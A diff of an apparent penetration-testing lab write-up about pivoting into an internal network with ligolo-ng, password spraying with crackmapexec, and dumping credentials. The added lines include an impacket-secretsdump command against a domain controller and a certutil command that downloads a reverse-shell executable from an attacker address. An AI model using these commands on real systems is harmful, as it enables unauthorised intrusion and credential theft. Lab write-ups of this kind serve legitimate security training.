@@ -2,6 +2,11 @@
 
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+| Network         | Description      |
+| --------------- | ---------------- |
+| 192.168.80.0/24 | External Network |
+| 192.168.98.0/24 | Internal Network |
+
 ## Initial Access to Linux Web Server
 
 ### Host Discovery
@@ -126,23 +131,22 @@ Transfer and set up all in the target machine
 
 Now, setup the attacker machine with ligolo-ng proxy
 
-```bash
-# Attacker Machine
+<pre class="language-bash"><code class="lang-bash"># Attacker Machine
 
-sudo ip tuntap add user <YOUR_USER> mode tun ligolo
+sudo ip tuntap add user &#x3C;YOUR_USER> mode tun ligolo
 
 # Delete the 192.168.98.0/24 IP Range from the tun0 interface :
 sudo ip route del 192.168.98.0/24 dev tun0
 
 # Up the ligolo interface:
-sudo ip link set ligolo up
-
+<strong>sudo ip link set ligolo up
+</strong>
 # Add 192.168.98.0/24 IP range to the ligolo interface:
 sudo ip route add 192.168.98.0/24 dev ligolo
 
 # Check if the route has been added
 ip route
-```
+</code></pre>
 
 Then, start the proxy server
 
@@ -325,7 +329,9 @@ nmap -sT 192.168.98.30
 
 ### Password Spray with found credentials
 
-With the AD credentials found in the Firefoz Bookmarks we can try to perform a password spray to host discovered.
+With the AD credentials found in the Firefox Bookmarks we can try to perform a password spray to host discovered.
+
+Let's create a file with all live host in the network.
 
 {% code title="target.txt" %}
 ```bash
@@ -353,13 +359,14 @@ Now we can perform a dump of credentials stored in that machine.
 
 ```bash
 crackmapexec --verbose smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
+
+impacket-secretsdump $DOMAIN.COM/$USER:$PASS@$DC_IP
 ```
 
 Then if we will find other credentials we can repeform a password spray.
 
-```bash
-crackmapexec --verbose smb target.txt -u corpmngr -p 'User4&*&*'
-```
+<pre class="language-bash"><code class="lang-bash"><strong>crackmapexec --verbose smb target.txt -u corpmngr -p 'User4&#x26;*&#x26;*'
+</strong></code></pre>
 
 If we get a result with `(Pwn3d!)` writing, it mean that this user is local administrator at the machine.
 
@@ -510,6 +517,8 @@ Transfer the file to target machine
 ```bash
 # target machine
 iwr http://$ATT_IP/rev.exe -OutFile C:\Tmp\rev.exe
+
+certutil -urlcache -f http://IP:PORT/rev.exe rev.exe
 ```
 
 Set a listener and then run the executable
